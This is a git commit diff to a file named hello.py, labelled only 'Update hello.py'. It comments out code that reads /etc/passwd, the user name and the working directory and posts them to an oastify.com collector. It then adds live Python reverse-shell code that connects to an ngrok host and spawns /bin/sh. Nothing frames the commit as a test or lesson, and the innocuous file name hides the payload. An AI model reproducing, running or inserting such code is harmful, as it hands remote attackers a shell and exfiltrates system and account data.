3412dfae86ccff1bd48b30b8dd89e12941294072
MaorCY <124798781+MaorCY@users.noreply.github.com>
2024-07-24 17:07:49 +0300

    Update hello.py

--- hello.py
+++ hello.py
@@ -61,45 +61,56 @@
 
 # -----------------------
 
-import os
-import pwd
-import urllib.parse
-import urllib.request
+# import os
+# import pwd
+# import urllib.parse
+# import urllib.request
 
-# Get the current working directory
-current_directory = os.getcwd()
+# # Get the current working directory
+# current_directory = os.getcwd()
 
-# Get the current user
-user_info = pwd.getpwuid(os.getuid())
-current_user = user_info.pw_name
+# # Get the current user
+# user_info = pwd.getpwuid(os.getuid())
+# current_user = user_info.pw_name
 
-# Read the contents of /opt/text file
-opt_text_file_path = '/etc/passwd'
-try:
-    with open(opt_text_file_path, 'r') as opt_text_file:
-        opt_contents = opt_text_file.read()
-except FileNotFoundError:
-    opt_contents = "File not found."
+# # Read the contents of /opt/text file
+# opt_text_file_path = '/etc/passwd'
+# try:
+#     with open(opt_text_file_path, 'r') as opt_text_file:
+#         opt_contents = opt_text_file.read()
+# except FileNotFoundError:
+#     opt_contents = "File not found."
 
-# Define the URL to send the data
-url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
+# # Define the URL to send the data
+# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
 
-# Create a dictionary with the data to send
-data = {
-    'directory': current_directory,
-    'user': current_user,
-    'opt_contents': opt_contents
-}
+# # Create a dictionary with the data to send
+# data = {
+#     'directory': current_directory,
+#     'user': current_user,
+#     'opt_contents': opt_contents
+# }
 
-# Encode the data for the URL
-encoded_data = urllib.parse.urlencode(data, doseq=True).encode('utf-8')
+# # Encode the data for the URL
+# encoded_data = urllib.parse.urlencode(data, doseq=True).encode('utf-8')
 
-# Send the data to the URL
-try:
-    with urllib.request.urlopen(url, data=encoded_data) as response:
-        print(f'Data sent successfully to {url}')
-except urllib.error.URLError as e:
-    print(f'An error occurred: {e.reason}')
+# # Send the data to the URL
+# try:
+#     with urllib.request.urlopen(url, data=encoded_data) as response:
+#         print(f'Data sent successfully to {url}')
+# except urllib.error.URLError as e:
+#     print(f'An error occurred: {e.reason}')
 
-# Print the contents of /opt/text file
-print(f"Contents of {opt_text_file_path}:\n{opt_contents}")
+# # Print the contents of /opt/text file
+# print(f"Contents of {opt_text_file_path}:\n{opt_contents}")
+
+# -------------------------
+
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("0.tcp.eu.ngrok.io",10992))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
+ 
